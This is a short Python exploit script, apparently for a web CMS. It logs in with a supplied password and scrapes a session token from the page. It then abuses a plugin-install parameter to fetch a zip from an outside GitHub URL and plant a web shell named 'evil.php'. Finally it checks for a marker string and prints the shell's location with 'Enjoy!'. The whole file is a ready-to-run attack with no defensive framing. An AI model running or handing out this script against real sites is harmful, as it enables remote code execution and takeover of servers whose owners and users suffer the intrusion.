import requests
import argparse
import re
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Remote Code Execution Exploit Script.')
parser.add_argument('loginURL', type=str, help='URL para o login')
parser.add_argument('password', type=str, help='Senha para o login')

args = parser.parse_args()

loginURL = args.loginURL
password = args.password

r = requests.session()
data = { "password" : password }
page = r.post(loginURL, data)

if "Wrong" in page.text:
    print("[!] Exploit Failed : Wrong Credential")
    exit()

print("[+] Getting Token")
soup = BeautifulSoup(page.text, "html.parser")

allscript = soup.find_all("script")
for i in allscript:
    if "rootURL" in str(i):
        url = i.string.split("=")[1].replace('"', '').strip(";").lstrip(" ")
    elif "token" in str(i):
        token = i.string.split("=")[1].replace('"', '').strip(";").lstrip(" ")

payload = "https://github.com/0xGabe/wonderplugin/archive/master.zip"

def sendPayload(req, url, payload, token):
    getShell = url + "?installThemePlugin=" + payload + "&type=plugins&token=" + token
    req.get(getShell)
    shell = url + "plugins/wonderplugin/evil.php"
    checkshell = req.get(shell)
    if "randosndoafasfaasda" in checkshell.text:
        return True
    else:
        return False

print("[+] Sending Payload")
shell = sendPayload(r, url, payload, token)

if shell == True:
    print("[+] Get the shell")
    print("[+] Enjoy!")
    shell = url + "plugins/wonderplugin/evil.php"
    print("[+] File created at: " + shell)
else:
    print("[!] Failed to exploit")
